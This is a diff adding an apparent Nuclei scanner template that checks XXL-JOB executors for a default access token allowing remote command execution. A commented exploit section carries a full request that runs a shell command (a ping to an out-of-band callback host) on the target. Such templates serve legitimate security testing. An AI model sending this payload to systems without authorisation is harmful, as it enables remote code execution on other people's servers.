@@ -1,0 +1,70 @@
+id: xxl-job-executor-default-token-rce
+
+info:
+  name: XXL-JOB执行器 默认Token 远程命令执行漏洞
+  author: SleepingBag945
+  severity: critical
+
+http:
+  - raw:
+      - |
+        POST /run HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Content-Type: application/json
+
+        {}
+
+      - |
+        POST /run HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        XXL-JOB-ACCESS-TOKEN: default_token
+        Content-Type: application/json
+
+        {}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body_1
+        words:
+          - "The access token is wrong."
+
+      - type: word
+        part: body_2
+        words:
+          - "glueType"
+
+      - type: status
+        status:
+          - 200
+
+# EXP
+
+# POST /run HTTP/1.1
+# Host: {{Hostname}}
+# User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
+# Accept-Encoding: gzip, deflate, br
+# Accept: */*
+# XXL-JOB-ACCESS-TOKEN: default_token
+# Content-Type: application/json
+
+# {
+#   "jobId": {{randjobid}},
+#   "executorHandler": "demoJobHandler",
+#   "executorParams": "demoJobHandler",
+#   "executorBlockStrategy": "COVER_EARLY",
+#   "executorTimeout": 0,
+#   "logId": {{randjobid}},
+#   "logDateTime": {{unix_time}},
+#   "glueType": "GLUE_SHELL",
+#   "glueSource": "ping {{interactsh-url}}",
+#   "glueUpdatetime": {{unix_time}},
+#   "broadcastIndex": 0,
+#   "broadcastTotal": 0
+# }
